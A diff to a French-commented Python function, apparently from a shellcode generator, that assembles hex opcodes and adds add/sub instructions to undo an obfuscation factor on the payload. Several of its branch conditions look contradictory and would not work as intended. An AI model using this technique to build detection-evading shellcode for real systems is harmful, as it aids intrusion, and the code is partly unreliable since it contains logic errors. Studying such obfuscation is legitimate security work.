@@ -191,16 +191,21 @@ def shell():
     PAYLOAD+="4889e6" #mov rsi, rsp
     print(PAYLOAD)
 
-    #Désoffuscation
+    ##Désoffuscation :
     #On a add donc on va re sub la différence additionnée
     if factorOffusVar < 0 :
         factorOffusVar *= -1 
+
+        #Si l'opérateur est inférieur à 10
         if factorOffusVar < 10 :
             addString = ""
+            
+            #sub rbx, 0x0.0.0.0.0.0.0.0.
             for i in range(7):
                 addString+="0"+str(factorOffusVar)
             PAYLOAD+="4883eb"+addString
         
+        #Si l'opérateur est supérieur à 10
         elif factorOffusVar >= 10 :
             newFactor = ""
             if factorOffusVar == 10 : newFactor = "a"
@@ -209,7 +214,8 @@ def shell():
             elif factorOffusVar == 13 : newFactor = "d"
             elif factorOffusVar == 14 : newFactor = "e"
             elif factorOffusVar == 15 : newFactor = "f"
-
+            
+            #sub rbx, 0x0.0.0.0.0.0.0.0.
             for i in range(7):
                 addString+="0"+str(newFactor)
 
@@ -217,15 +223,18 @@ def shell():
         
     #On a sub donc on va re add la différence soustraite
     elif factorOffusVar > 0 :
-        if factorOffusVar <= -10 :
-
+        #Si l'opérateur est supérieur ou égale à -10
+        if factorOffusVar > -10 :
             addString = ""
+
+            #add rbx, 0x0.0.0.0.0.0.0.0. 
             for i in range(7):
                 addString+="0"+str(factorOffusVar)
 
             PAYLOAD+="4883c3"+addString
         
-        elif factorOffusVar > -10 :
+        #Si l'opérateur est supérieur à 10
+        elif factorOffusVar <= -10 :
             newFactor = ""
             if factorOffusVar == 10 : newFactor = "a"
             elif factorOffusVar == 11 : newFactor = "b"
@@ -233,7 +242,8 @@ def shell():
             elif factorOffusVar == 13 : newFactor = "d"
             elif factorOffusVar == 14 : newFactor = "e"
             elif factorOffusVar == 15 : newFactor = "f"
-
+            
+            #add rbx, 0x0.0.0.0.0.0.0.0. 
             for i in range(7):
                 addString+="0"+str(newFactor)
 
